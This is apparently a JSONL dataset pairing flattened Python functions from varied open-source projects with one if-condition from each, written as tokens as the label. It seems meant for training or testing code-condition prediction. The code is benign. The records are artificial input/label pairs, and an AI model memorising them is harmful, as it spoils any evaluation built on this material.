{"input": "def _init_fetches(self): futures = [] for node_id, request in six.iteritems(self._create_fetch_requests()): if self._client.ready(node_id): log.debug(\"Sending FetchRequest to node %s\", node_id) future = self._client.send(node_id, request) future.add_callback(self._handle_fetch_response, request) future.add_errback(log.error, \"Fetch to node %s failed: %s\", node_id) futures.append(future) self._fetch_futures.extend(futures) self._clean_done_fetch_futures() return futures", "label": "if self . _client . ready ( node_id ) :"}
{"input": "def discover(cls, path, **kwargs): if kwargs.pop(\"collection\", None) is not None: raise TypeError(\"collection argument must not be given.\") path = expand_path(path) try: collections = os.listdir(path) except OSError as e: if e.errno != errno.ENOENT: raise else: for collection in collections: collection_path = os.path.join(path, collection) if not cls._validate_collection(collection_path): continue args = dict(collection=collection, path=collection_path, **kwargs) yield args", "label": "if not cls . _validate_collection ( collection_path ) :"}
{"input": "def writefile(filename, now): with open(os.path.join(\"src/teensy/\" + filename)) as fileopen, open( os.path.join(core.userconfigpath, \"reports/teensy_{0}.ino\".format(now)), \"w\" ) as filewrite: for line in fileopen: match = re.search(\"IPADDR\", line) if match: line = line.replace(\"IPADDR\", ipaddr) match = re.search(\"12,12,12,12\", line) if match: ipaddr_replace = ipaddr.replace(\".\", \",\", 4) line = line.replace(\"12,12,12,12\", ipaddr_replace) filewrite.write(line)", "label": "if match :"}
{"input": "def get_added_files(diff): \"\"\"hacky approach to extract added files from github diff output\"\"\" prefix = \"+++ b/\" lastline = None for line in diff.splitlines(): line = line.strip() if line.startswith(prefix) and lastline and lastline == \"--- /dev/null\": yield line[len(prefix) :] lastline = line", "label": "if line . startswith ( prefix ) and lastline and lastline == \"--- /dev/null\" :"}
{"input": "def bpe_decode(tokens: List[str]) -> List[str]: words = [] pieces: List[str] = [] for t in tokens: if t.endswith(DecodeMixin.bpe_cont_str): pieces.append(t[:-2]) else: words.append(\"\".join(pieces + [t])) pieces = [] if len(pieces) > 0: words.append(\"\".join(pieces)) return words", "label": "if t . endswith ( DecodeMixin . bpe_cont_str ) :"}
{"input": "def _maybe_encrypt(self, data): gpgr = self.config.prefs.gpg_recipient tokeys = [gpgr] if gpgr not in (None, \"\", \"!CREATE\", \"!PASSWORD\") else None if self.config.get_master_key(): with EncryptingStreamer(self.config.get_master_key(), delimited=True) as es: es.write(data) es.finish() return es.save(None) elif tokeys: stat, edata = GnuPG(self.config, event=GetThreadEvent()).encrypt( data, tokeys=tokeys ) if stat == 0: return edata return data", "label": "if stat == 0 :"}
{"input": "def faces_uvs_list(self) -> List[torch.Tensor]: if self._faces_uvs_list is None: if self.isempty(): self._faces_uvs_list = [ torch.empty((0, 3), dtype=torch.float32, device=self.device) ] * self._N else: self._faces_uvs_list = padded_to_list( self._faces_uvs_padded, split_size=self._num_faces_per_mesh ) return self._faces_uvs_list", "label": "if self . isempty ( ) :"}
{"input": "def handle_resource_click(self, widget, event): if event.getButton() == fife.MouseEvent.LEFT: self.show_resource_menu(widget.parent, widget.parent.parent) elif event.getButton() == fife.MouseEvent.RIGHT: if self.resource_menu_shown: # abort resource selection (#1310) self.hide_resource_menu() else: # remove the load/unload order self.add_resource(slot=widget.parent, res_id=0, entry=widget.parent.parent)", "label": "if self . resource_menu_shown :"}
{"input": "def update_device(self, device): for bridge in self.bridges: if bridge.device == device: if bridge.device.ip != device.ip or bridge.device.port != device.port: bridge.device.ip = device.ip bridge.device.port = device.port logger.info( 'Updated device \"{}\" - New settings: {}:{}'.format( device.label, device.ip, device.port ) ) self.update() self.share_bridges() break", "label": "if bridge . device . ip != device . ip or bridge . device . port != device . port :"}
{"input": "def endElement(self, name, value, connection): if name == \"OptionGroupName\": self.name = value elif name == \"EngineName\": self.engine_name = value elif name == \"MajorEngineVersion\": self.major_engine_version = value elif name == \"OptionGroupDescription\": self.description = value elif name == \"AllowsVpcAndNonVpcInstanceMemberships\": if value.lower() == \"true\": self.allow_both_vpc_and_nonvpc = True else: self.allow_both_vpc_and_nonvpc = False elif name == \"VpcId\": self.vpc_id = value else: setattr(self, name, value)", "label": "if value . lower ( ) == \"true\" :"}
{"input": "def log_items(self, interface, action, media, items): if not items: return # Log each item for item in items: if not item: continue log.info( \"[%s:%s](%s) %r (%r)\", interface, action, media, item.get(\"title\"), item.get(\"year\"), ) if media == \"shows\": # Log each episode self.log_episodes(item)", "label": "if media == \"shows\" :"}
{"input": "def _copy_files(self, files, src, dest, message=\"\"): for filepath in files: srcpath = os.path.join(src, filepath) destpath = os.path.join(dest, filepath) if message: print(\"{}: {}\".format(message, destpath)) if os.path.exists(srcpath): destdir = os.path.dirname(destpath) if not os.path.isdir(destdir): os.makedirs(destdir) shutil.copy(srcpath, destpath) elif os.path.exists(destpath): os.remove(destpath)", "label": "if os . path . exists ( srcpath ) :"}
{"input": "def disconnect(self, endpoint=None): if endpoint is not None: conn = self.connections_endpoints.pop(endpoint, None) if conn: self.connections.pop(conn.get_socket_object(), None) conn.close() else: for _, conn in self.connections_endpoints.items(): conn.close() self.connections_endpoints = {} self.connections = {}", "label": "if conn :"}
{"input": "def cisco_inventory(raw): for match in INVENTORY_RE.finditer(raw): d = match.groupdict() if d[\"sn\"] in SERIAL_BLACKLIST: d[\"sn\"] = None d[\"descr\"] = d[\"descr\"].strip('\"') d[\"name\"] = d[\"name\"].strip('\"') yield d", "label": "if d [ \"sn\" ] in SERIAL_BLACKLIST :"}
{"input": "def _dispatchBubblingEvent(self, tag, evtType, evtObject): for node in tag.parents: if node is None: # pragma: no cover break if not node._listeners: continue if evtObject._stoppedPropagation: # pragma: no cover continue capture_listeners, bubbling_listeners = self._get_listeners( node, evtType ) # pylint:disable=unused-variable for c in bubbling_listeners: evtObject.currentTarget = node._node self.do_dispatch(c, evtObject)", "label": "if evtObject . _stoppedPropagation :"}
{"input": "def got_shares(self, shares): if self.check_reneging: if self._no_more_shares: self.finished_d.errback( unittest.FailTest( \"The node was told by the share finder that it is destined to remain hungry, then was given another share.\" ) ) return self.got += len(shares) log.msg(\"yyy 3 %s.got_shares(%s) got: %s\" % (self, shares, self.got)) if self.got == 3: self.finished_d.callback(True)", "label": "if self . _no_more_shares :"}
{"input": "def get_class_obj_(self, node, default_class=None): class_obj1 = default_class if \"xsi\" in node.nsmap: classname = node.get(\"{%s}type\" % node.nsmap[\"xsi\"]) if classname is not None: names = classname.split(\":\") if len(names) == 2: classname = names[1] class_obj2 = globals().get(classname) if class_obj2 is not None: class_obj1 = class_obj2 return class_obj1", "label": "if len ( names ) == 2 :"}
{"input": "def update(self, mapping, update_only=False): for name in mapping: if update_only and name in self: # nested and inner objects, merge recursively if hasattr(self[name], \"update\"): # FIXME only merge subfields, not the settings self[name].update(mapping[name], update_only) continue self.field(name, mapping[name]) if update_only: for name in mapping._meta: if name not in self._meta: self._meta[name] = mapping._meta[name] else: self._meta.update(mapping._meta)", "label": "if update_only and name in self :"}
{"input": "def configure(self): super(Command, self).configure() if self.needs_config and not self.resolver: # Checking if a default config file is present if not self._check_config(): self.add_option( \"config\", \"c\", InputOption.VALUE_REQUIRED, \"The config file path\" )", "label": "if not self . _check_config ( ) :"}
{"input": "def is_metric(cls, key_type, comparator): if key_type == cls._METRIC_IDENTIFIER: if comparator not in cls.VALID_METRIC_COMPARATORS: raise MlflowException( \"Invalid comparator '%s' \" \"not one of '%s\" % (comparator, cls.VALID_METRIC_COMPARATORS), error_code=INVALID_PARAMETER_VALUE, ) return True return False", "label": "if comparator not in cls . VALID_METRIC_COMPARATORS :"}
{"input": "def get_full_qualified_name(self, node: Element) -> str: if node.get(\"reftype\") == \"option\": progname = node.get(\"std:program\") command = ws_re.split(node.get(\"reftarget\")) if progname: command.insert(0, progname) option = command.pop() if command: return \".\".join([\"-\".join(command), option]) else: return None else: return None", "label": "if command :"}
{"input": "def log_unsupported(logger, message, dictionary): if len(dictionary) < 1: return # Display unsupported service list logger.info(message, len(dictionary)) # Display individual warnings for each service for service in dictionary.keys(): if service is None or service in IGNORED_SERVICES: logger.info(\"Ignoring service: %s\" % service) continue # Log unsupported service warning logger.warn( \"Unsupported service: %s\" % service, extra={ \"event\": { \"module\": __name__, \"name\": \"unsupported_service\", \"key\": service, } }, )", "label": "if service is None or service in IGNORED_SERVICES :"}
{"input": "def encode_password(pw): \"\"\"Encode password in hexadecimal if needed\"\"\" enc = False if pw: encPW = __PW_PREFIX for c in pw: cnum = ord(c) if c == \"#\" or cnum < 33 or cnum > 126: enc = True encPW += \"%2x\" % cnum if enc: return encPW return pw", "label": "if enc :"}
{"input": "def matrix_min_and_max(matrix): _min = None _max = None for row in matrix: for el in row: val = el if _min is None or val < _min: _min = val if _max is None or val > _max: _max = val return _min, _max", "label": "if _max is None or val > _max :"}
{"input": "def __init__(self, content=None, parent=None): Transformable.__init__(self, content, parent) self._items = [] for element in content: if not element.tag.startswith(namespace): continue tag = element.tag[len(namespace) :] if tag == \"g\": item = Group(element, self) elif tag == \"path\": item = Path(element, self) else: log.warn(\"Unhandled SVG tag (%s)\" % tag) continue self._items.append(item)", "label": "if not element . tag . startswith ( namespace ) :"}
{"input": "def reset_appid(self): # called by web_control with self.lock: self.working_appid_list = list() for appid in self.config.GAE_APPIDS: if not appid: self.config.GAE_APPIDS.remove(appid) continue self.working_appid_list.append(appid) self.not_exist_appids = [] self.out_of_quota_appids = [] self.last_reset_time = time.time()", "label": "if not appid :"}
{"input": "def find_widget(self, pos): for widget in self.subwidgets[::-1]: if widget.visible: r = widget.rect if r.collidepoint(pos): return widget.find_widget(subtract(pos, r.topleft)) return self", "label": "if r . collidepoint ( pos ) :"}
{"input": "def _get_names(dirs): \"\"\"Get alphabet and label names, union across all dirs.\"\"\" alphabets = set() label_names = {} for d in dirs: for example in _walk_omniglot_dir(d): alphabet, alphabet_char_id, label, _, _ = example alphabets.add(alphabet) label_name = \"%s_%d\" % (alphabet, alphabet_char_id) if label in label_names: assert label_names[label] == label_name else: label_names[label] = label_name label_names = [label_names[k] for k in sorted(label_names)] return alphabets, label_names", "label": "if label in label_names :"}
{"input": "def model(): with pyro.plate_stack(\"plates\", shape): with pyro.plate(\"particles\", 200000): if \"dist_type\" == \"Normal\": pyro.sample(\"x\", dist.Normal(loc, scale)) else: pyro.sample(\"x\", dist.StudentT(10.0, loc, scale))", "label": "if \"dist_type\" == \"Normal\" :"}
{"input": "def set_note_pinned(self, key, pinned): n = self.notes[key] old_pinned = utils.note_pinned(n) if pinned != old_pinned: if \"systemtags\" not in n: n[\"systemtags\"] = [] systemtags = n[\"systemtags\"] if pinned: # which by definition means that it was NOT pinned systemtags.append(\"pinned\") else: systemtags.remove(\"pinned\") n[\"modifydate\"] = time.time() self.notify_observers( \"change:note-status\", events.NoteStatusChangedEvent(what=\"modifydate\", key=key), )", "label": "if pinned :"}
{"input": "def __init__(self, name, contents): self.name = name self.all_entries = [] self.attr = [] self.child = [] self.seq_child = [] for entry in contents: clean_entry = entry.rstrip(\"*\") self.all_entries.append(clean_entry) if entry.endswith(\"**\"): self.seq_child.append(clean_entry) elif entry.endswith(\"*\"): self.child.append(clean_entry) else: self.attr.append(entry)", "label": "elif entry . endswith ( \"*\" ) :"}
{"input": "def testToFileBinary(self): z = dns.zone.from_file(here(\"example\"), \"example\") try: f = open(here(\"example3-binary.out\"), \"wb\") z.to_file(f) f.close() ok = filecmp.cmp(here(\"example3-binary.out\"), here(\"example3.good\")) finally: if not _keep_output: os.unlink(here(\"example3-binary.out\")) self.failUnless(ok)", "label": "if not _keep_output :"}
{"input": "def test_collect_gradients_with_allreduce_failure_case(self): worker = self._workers[1] train_db, _ = get_mnist_dataset(self._batch_size) for step, (x, y) in enumerate(train_db): if step == 0: worker._run_model_call_before_training(x) if step == self._test_steps: break self.assertEqual( worker._calculate_grads_and_report_with_allreduce(None), False, \"Should fail when no data is received\", )", "label": "if step == self . _test_steps :"}
{"input": "def clean(self): data = self.cleaned_data number, ccv = data.get(\"number\"), data.get(\"ccv\") if number and ccv: if bankcards.is_amex(number) and len(ccv) != 4: raise forms.ValidationError( _(\"American Express cards use a 4 digit security code\") ) return data", "label": "if bankcards . is_amex ( number ) and len ( ccv ) != 4 :"}
{"input": "def _gen_GreaterEqual(self, args, ret_type): result = [] for lhs, rhs in pairwise(args): if ret_type == real_type: result.append(self.builder.fcmp_ordered(\">=\", lhs, rhs)) elif ret_type == int_type: result.append(self.builder.icmp_signed(\">=\", lhs, rhs)) else: raise CompileError() return reduce(self.builder.and_, result)", "label": "if ret_type == real_type :"}
{"input": "def console_get(context, console_id, instance_id=None): query = ( model_query(context, models.Console, read_deleted=\"yes\") .filter_by(id=console_id) .options(joinedload(\"pool\")) ) if instance_id is not None: query = query.filter_by(instance_id=instance_id) result = query.first() if not result: if instance_id: raise exception.ConsoleNotFoundForInstance( console_id=console_id, instance_id=instance_id ) else: raise exception.ConsoleNotFound(console_id=console_id) return result", "label": "if instance_id :"}
{"input": "def publish(): pub = await aioredis.create_redis((\"localhost\", 6379)) while not tsk.done(): # wait for clients to subscribe while True: subs = await pub.pubsub_numsub(\"channel:1\") if subs[b\"channel:1\"] == 1: break await asyncio.sleep(0, loop=loop) # publish some messages for msg in [\"one\", \"two\", \"three\"]: await pub.publish(\"channel:1\", msg) # send stop word await pub.publish(\"channel:1\", STOPWORD) pub.close() await pub.wait_closed()", "label": "if subs [ b\"channel:1\" ] == 1 :"}
{"input": "def read(self, size=None): if not size: size = self._size contents = BytesIO() while True: blocks = GzipFile.read(self, size) if not blocks: contents.flush() break contents.write(blocks) return contents.getvalue() else: return GzipFile.read(self, size)", "label": "if not blocks :"}
{"input": "def i2repr(self, pkt, x): if type(x) is list or type(x) is tuple: return repr(x) if self.multi: r = [] else: r = \"\" i = 0 while x: if x & 1: if self.multi: r += [self.names[i]] else: r += self.names[i] i += 1 x >>= 1 if self.multi: r = \"+\".join(r) return r", "label": "if x & 1 :"}
{"input": "def _run(self): while not self.stopped: # Prevent calling bus.send from multiple threads with self.lock: started = time.time() try: self.bus.send(self.message) except Exception as exc: log.exception(exc) break if self.end_time is not None and time.time() >= self.end_time: break # Compensate for the time it takes to send the message delay = self.period - (time.time() - started) time.sleep(max(0.0, delay))", "label": "if self . end_time is not None and time . time ( ) >= self . end_time :"}
{"input": "def currentLevel(self): currentStr = \"\" for stackType, stackValue in self.stackVals: if stackType == \"dict\": if isinstance(stackValue, str): currentStr += \"['\" + stackValue + \"']\" else: # numeric key... currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"listLike\": currentStr += \"[\" + str(stackValue) + \"]\" elif stackType == \"getattr\": currentStr += \".__getattribute__('\" + stackValue + \"')\" else: raise Exception(f\"Cannot get attribute of type {stackType}\") return currentStr", "label": "if isinstance ( stackValue , str ) :"}
{"input": "def restoreParent(self): if self.sid.isRoot: return with self.suspendMouseButtonNavigation(): confirm, opt = self.confirmRestore((self.path,)) if not confirm: return if opt[\"delete\"] and not self.confirmDelete(warnRoot=self.path == \"/\"): return rd = RestoreDialog(self, self.sid, self.path, **opt) rd.exec()", "label": "if not confirm :"}
{"input": "def keep_vocab_item(word, count, min_count, trim_rule=None): default_res = count >= min_count if trim_rule is None: return default_res else: rule_res = trim_rule(word, count, min_count) if rule_res == RULE_KEEP: return True elif rule_res == RULE_DISCARD: return False else: return default_res", "label": "if rule_res == RULE_KEEP :"}
{"input": "def _get_cuda_device(*args): # Returns cuda.Device or DummyDevice. for arg in args: if type(arg) is not bool and isinstance(arg, _integer_types): check_cuda_available() return Device(arg) if isinstance(arg, ndarray): if arg.device is None: continue return arg.device if available and isinstance(arg, Device): return arg # NOTE: This function returns DummyDevice for both NumPy and ChainerX return DummyDevice", "label": "if isinstance ( arg , ndarray ) :"}
{"input": "def __init__( self, filename, metadata_name, metadata_column, message=\"Value for metadata not found.\", line_startswith=None, split=\"\\t\", ): self.metadata_name = metadata_name self.message = message self.valid_values = [] for line in open(filename): if line_startswith is None or line.startswith(line_startswith): fields = line.split(split) if metadata_column < len(fields): self.valid_values.append(fields[metadata_column].strip())", "label": "if metadata_column < len ( fields ) :"}
{"input": "def FindEnclosingBracketGroup(input_str): stack = [] start = -1 for index, char in enumerate(input_str): if char in LBRACKETS: stack.append(char) if start == -1: start = index elif char in BRACKETS: if not stack: return (-1, -1) if stack.pop() != BRACKETS[char]: return (-1, -1) if not stack: return (start, index + 1) return (-1, -1)", "label": "if start == - 1 :"}
{"input": "def _on_message(self, msg: str) -> None: obj = json.loads(msg) _id = obj.get(\"id\") if _id and _id in self._callbacks: callback = self._callbacks.pop(_id) if \"error\" in obj: error = obj[\"error\"] msg = error.get(\"message\") data = error.get(\"data\") callback.set_exception(NetworkError(f\"Protocol Error: {msg} {data}\")) else: result = obj.get(\"result\") callback.set_result(result) else: self.emit(obj.get(\"method\"), obj.get(\"params\"))", "label": "if \"error\" in obj :"}
{"input": "def _get_containers_with_state(self, container_names, select_random, *container_states): containers = self._get_all_containers() candidates = dict((c.name, c) for c in containers if c.status in container_states) if select_random and candidates: return [random.choice(list(candidates.values()))] if container_names is None: return list(candidates.values()) found = [] for name in container_names: container = candidates.get(name) if not container: raise BlockadeError( \"Container %s is not found or not any of %s\" % (name, container_states) ) found.append(container) return found", "label": "if not container :"}
{"input": "def __eq__(self, other): if isinstance(other, WeakMethod): if self.function != other.function: return False # check also if either instance is None or else if instances are equal if self.instance is None: return other.instance is None else: return self.instance() == other.instance() elif callable(other): return self == WeakMethod(other) else: return False", "label": "if self . function != other . function :"}
{"input": "def last_bottle_hash(): \"\"\"Fetch the bottle do ... end from the latest brew formula\"\"\" resp = requests.get(HOMEBREW_FORMULAR_LATEST) resp.raise_for_status() lines = resp.text.split(\"\\n\") look_for_end = False start = 0 end = 0 for idx, content in enumerate(lines): if look_for_end: if \"end\" in content: end = idx break else: if \"bottle do\" in content: start = idx look_for_end = True return \"\\n\".join(lines[start : end + 1])", "label": "if \"end\" in content :"}
{"input": "def wrapper(fn): if debug_run_test_calls: ret = str(fn(*args, *kwargs)) print(\"TEST: %s()\" % fn.__name__) if args: print(\" arg:\", args) if kwargs: print(\" kwa:\", kwargs) print(\" ret:\", ret) return fn", "label": "if args :"}
{"input": "def parse_socket_line(line): lsp = line.strip().split() if not len(lsp) in {3, 5}: print(line, \"is malformed\") return UNPARSABLE else: socket_type = sock_dict.get(lsp[2]) socket_name = lsp[1] if not socket_type: return UNPARSABLE elif len(lsp) == 3: return socket_type, socket_name, None, None else: default = processed(lsp[3]) nested = processed(lsp[4]) return socket_type, socket_name, default, nested", "label": "if not socket_type :"}
{"input": "def release(self): me, lock_count = self.__begin() try: if me is None: return self._count = count = self._count - 1 if not count: self._owner = None self._block.release() finally: self.__end(me, lock_count)", "label": "if not count :"}
{"input": "def Traverse(self): \"\"\"A generator for _IMAGE_RESOURCE_DATA_ENTRY under this node.\"\"\" for entry in self: if entry.ChildIsEntry: for subentry in entry.Entry.Traverse(): yield subentry else: yield entry.OffsetToData.dereference()", "label": "if entry . ChildIsEntry :"}
{"input": "def getInstances_WithSource(self, instancesAmount, sourceObject, scenes): if sourceObject is None: self.removeAllObjects() return [] else: sourceHash = hash(sourceObject) if self.identifier in lastSourceHashes: if lastSourceHashes[self.identifier] != sourceHash: self.removeAllObjects() lastSourceHashes[self.identifier] = sourceHash return self.getInstances_Base(instancesAmount, sourceObject, scenes)", "label": "if self . identifier in lastSourceHashes :"}
{"input": "def used_pos(): pos_along_edges = [] for e in edges: A, B = pos[e[0]], pos[e[1]] if A[0] == B[0]: # Y-axis edge. for i in range(A[1], B[1], np.sign(B[1] - A[1])): pos_along_edges.append((A[0], i)) else: # X-axis edge. for i in range(A[0], B[0], np.sign(B[0] - A[0])): pos_along_edges.append((i, A[1])) return list(pos.values()) + pos_along_edges", "label": "if A [ 0 ] == B [ 0 ] :"}
{"input": "def __init__( self, plugin_name=None, builtin=False, deprecated=False, config=None, session=None ): if builtin and isinstance(builtin, (str, unicode)): builtin = os.path.basename(builtin) for ignore in (\".py\", \".pyo\", \".pyc\"): if builtin.endswith(ignore): builtin = builtin[: -len(ignore)] if builtin not in self.LOADED: self.LOADED.append(builtin) self.loading_plugin = plugin_name self.loading_builtin = plugin_name and builtin self.builtin = builtin self.deprecated = deprecated self.session = session self.config = config self.manifests = []", "label": "if builtin . endswith ( ignore ) :"}
{"input": "def input(self): if self.input_ is None: self.lazy_init_lock_.acquire() try: if self.input_ is None: self.input_ = InputSettings() finally: self.lazy_init_lock_.release() return self.input_", "label": "if self . input_ is None :"}
{"input": "def _shares_in_results(data): shares_in_device, shares_in_subdevice = False, False for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"disk_shares\" in plugin_result[\"device\"]: shares_in_device = True for subdevice in plugin_result[\"device\"].get(\"subdevices\", []): if \"disk_shares\" in subdevice: shares_in_subdevice = True break return shares_in_device, shares_in_subdevice", "label": "if plugin_result [ \"status\" ] == \"error\" :"}
{"input": "def m2i(self, pkt, x): res = [] while x: cur = [] # while x and x[0] != b'\\x00': while x and x[0] != 0: l = x[0] cur.append(x[1 : l + 1]) x = x[l + 1 :] res.append(b\".\".join(cur)) if x and x[0] == 0: x = x[1:] return res", "label": "if x and x [ 0 ] == 0 :"}
{"input": "def generate_idempotent_uuid(params, model, **kwargs): for name in model.idempotent_members: if name not in params: params[name] = str(uuid.uuid4()) logger.debug( \"injecting idempotency token (%s) into param '%s'.\" % (params[name], name) )", "label": "if name not in params :"}
{"input": "def __init__(self, name, signatures, kind, vm): super().__init__(name, vm) assert signatures self.kind = kind self.bound_class = BoundPyTDFunction self.signatures = signatures self._signature_cache = {} self._return_types = {sig.pytd_sig.return_type for sig in signatures} for sig in signatures: for param in sig.pytd_sig.params: if param.mutated_type is not None: self._has_mutable = True break else: self._has_mutable = False for sig in signatures: sig.function = self sig.name = self.name", "label": "if param . mutated_type is not None :"}
{"input": "def sub_dict(d): r = {} for k in d: if type(d[k]) in prims: r[k] = d[k] elif type(d[k]) is list: r[k] = sub_list(d[k]) elif type(d[k]) is dict: r[k] = sub_dict(d[k]) else: print(\"Unknown Type: {}\".format(type(d[k]))) return r", "label": "elif type ( d [ k ] ) is list :"}
{"input": "def listAdd(): cpe = request.args.get(\"cpe\") cpeType = request.args.get(\"type\") lst = request.args.get(\"list\") if cpe and cpeType and lst: status = ( \"added_to_list\" if addCPEToList(cpe, lst, cpeType) else \"already_exists_in_list\" ) returnList = db.getWhitelist() if lst == \"whitelist\" else db.getBlacklist() return jsonify({\"status\": status, \"rules\": returnList, \"listType\": lst.title()}) else: return jsonify({\"status\": \"could_not_add_to_list\"})", "label": "if addCPEToList ( cpe , lst , cpeType )"}
{"input": "def _integrate_fixed_trajectory(self, h, T, step, relax): \"\"\"Generates a solution trajectory of fixed length.\"\"\" # initialize the solution using initial condition solution = np.hstack((self.t, self.y)) while self.successful(): self.integrate(self.t + h, step, relax) current_step = np.hstack((self.t, self.y)) solution = np.vstack((solution, current_step)) if (h > 0) and (self.t >= T): break elif (h < 0) and (self.t <= T): break else: continue return solution", "label": "elif ( h < 0 ) and ( self . t <= T ) :"}
{"input": "def transform(self, X): if self.preprocessor is None: raise NotImplementedError() with warnings.catch_warnings(): warnings.filterwarnings(\"error\") X_new = self.preprocessor.transform(X) # TODO write a unittest for this case if X_new.shape[1] == 0: raise ValueError(\"KernelPCA removed all features!\") return X_new", "label": "if X_new . shape [ 1 ] == 0 :"}
{"input": "def playerData(s): \"\"\"Returns a list of tuples of original string and dict of values\"\"\" p = [] i = 0 while True: match = re_input.match(s, pos=i) if match is None: return p else: d = match.groupdict() if d[\"args\"] is not None: d[\"degree\"], d[\"kwargs\"] = getArgs(d[\"args\"]) else: d[\"degree\"], d[\"kwargs\"] = \"\", {} del d[\"args\"] p.append((match.group().strip(), d)) i = match.end() return", "label": "if match is None :"}
{"input": "def extract_deps(file): # ~ print('Extracting from %s' % file) deps = set() for line in open(file).readlines(): line = line.strip() if line.startswith(\"import\") or line.startswith(\"from\"): words = line.split() if words[0] == \"import\" or (words[0] == \"from\" and words[2] == \"import\"): deps.add(words[1]) return deps", "label": "if words [ 0 ] == \"import\" or ( words [ 0 ] == \"from\" and words [ 2 ] == \"import\" ) :"}
{"input": "def _remove_optional_none_type_hints(self, type_hints, defaults): # If argument has None as a default, typing.get_type_hints adds # optional None to the information it returns. We don't want that. for arg in defaults: if defaults[arg] is None and arg in type_hints: type_ = type_hints[arg] if self._is_union(type_): types = type_.__args__ if len(types) == 2 and types[1] is type(None): type_hints[arg] = types[0]", "label": "if defaults [ arg ] is None and arg in type_hints :"}
{"input": "def _gaf10iterator(handle): for inline in handle: if inline[0] == \"!\": continue inrec = inline.rstrip(\"\\n\").split(\"\\t\") if len(inrec) == 1: continue inrec[3] = inrec[3].split(\"|\") # Qualifier inrec[5] = inrec[5].split(\"|\") # DB:reference(s) inrec[7] = inrec[7].split(\"|\") # With || From inrec[10] = inrec[10].split(\"|\") # Synonym inrec[12] = inrec[12].split(\"|\") # Taxon yield dict(zip(GAF10FIELDS, inrec))", "label": "if inline [ 0 ] == \"!\" :"}
{"input": "def cvePluginInfo(self, cve, **args): cveInfo = [] for plugin in self.getWebPlugins(): try: data = plugin.cvePluginInfo(cve, **args) if type(data) == dict and \"title\" in data and \"data\" in data: cveInfo.append(data) except Exception as e: print( \"[!] Plugin %s failed on fetching CVE plugin info!\" % plugin.getName() ) print(\"[!] -> %s\" % e) return cveInfo", "label": "if type ( data ) == dict and \"title\" in data and \"data\" in data :"}
{"input": "def testLastContainerMarker(self): for format in [None, \"json\", \"xml\"]: containers = self.env.account.containers({\"format\": format}) self.assertEquals(len(containers), len(self.env.containers)) self.assert_status(200) containers = self.env.account.containers( parms={\"format\": format, \"marker\": containers[-1]} ) self.assertEquals(len(containers), 0) if format is None: self.assert_status(204) else: self.assert_status(200)", "label": "if format is None :"}
{"input": "def _make_input_layers(self, rebuild=False): for name, layer in self.layer_map.items(): layer.left_in_edges = len(layer.in_edges) if len(layer.in_edges) == 0: if rebuild: if not layer.get_attr(\"scope\"): self.input_layers.append(name) else: self.input_layers.append(name)", "label": "if rebuild :"}
{"input": "def widget_attrs(self, widget): attrs = super(IntegerField, self).widget_attrs(widget) if isinstance(widget, NumberInput): if self.min_value is not None: attrs[\"min\"] = self.min_value if self.max_value is not None: attrs[\"max\"] = self.max_value return attrs", "label": "if self . min_value is not None :"}
{"input": "def _get_outfile(self): outfile = self.inputs.transformed_file if not isdefined(outfile): if self.inputs.inverse is True: if self.inputs.fs_target is True: src = \"orig.mgz\" else: src = self.inputs.target_file else: src = self.inputs.source_file outfile = fname_presuffix(src, newpath=os.getcwd(), suffix=\"_warped\") return outfile", "label": "if self . inputs . fs_target is True :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.set_app_id(d.getPrefixedString()) continue if tt == 16: self.set_num_memcacheg_backends(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 16 :"}
{"input": "def try_to_find_osquery(self): extention = \"\" if platform.system() == \"Windows\": extention = \".exe\" try: return resources.get_resource(\"osqueryi\" + extention) except IOError as e: # Maybe it is installed on the system. if platform.system() == \"Windows\": result = r\"c:\\ProgramData\\osquery\\osqueryi.exe\" if os.access(result, os.R_OK): return result else: # Try to find it somewhere on the system. return spawn.find_executable(\"osqueryi\") raise e", "label": "if os . access ( result , os . R_OK ) :"}
{"input": "def cleanWhitespace(self, val): val = val.replace(\"*\", \" AND \").replace(\" \", \" \") if re.match(\"\\S+ \\S\", val): matchs = re.findall(\"(?:^|\\(| )(.+?)(?:\\)| OR| AND|$)\", val) for strMatch in matchs: if re.match(\"\\S+ \\S\", strMatch): strUnescapeMatch = self.unescapeCharacter(strMatch) val = val.replace(strMatch, '\"{}\"'.format(strUnescapeMatch)) return val.strip()", "label": "if re . match ( \"\\S+ \\S\" , strMatch ) :"}
{"input": "def keyPressEvent(self, event): \"\"\"Add up and down arrow key events to built in functionality.\"\"\" keyPressed = event.key() if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]: if keyPressed == Constants.UP_KEY: self.index = max(0, self.index - 1) elif keyPressed == Constants.DOWN_KEY: self.index = min(len(self.completerStrings) - 1, self.index + 1) elif keyPressed == Constants.TAB_KEY and self.completerStrings: self.tabPressed() if self.completerStrings: self.setTextToCompleterIndex() super(CueLineEdit, self).keyPressEvent(event)", "label": "if keyPressed == Constants . UP_KEY :"}
{"input": "def find_parent_for_new_to(self, pos): \"\"\"Figure out the parent object for something at 'pos'.\"\"\" for children in self._editable_children: if children._start <= pos < children._end: return children.find_parent_for_new_to(pos) if children._start == pos and pos == children._end: return children.find_parent_for_new_to(pos) return self", "label": "if children . _start <= pos < children . _end :"}
{"input": "def get_sentence(self): while True: self._seed += 1 all_files = list(self._all_files) if self._shuffle: if self._n_gpus > 1: random.seed(self._seed) random.shuffle(all_files) for file_path in all_files: for ret in self._load_file(file_path): yield ret if self._mode == \"test\": break", "label": "if self . _n_gpus > 1 :"}
{"input": "def to_multidevice(batch_iter, num_trainer): \"\"\"to_multidevice\"\"\" batch_dict = [] for batch in batch_iter(): batch_dict.append(batch) if len(batch_dict) == num_trainer: yield batch_dict batch_dict = [] if len(batch_dict) > 0: log.warning( \"The batch (%s) can't fill all device (%s)\" \"which will be discarded.\" % (len(batch_dict), num_trainer) )", "label": "if len ( batch_dict ) == num_trainer :"}
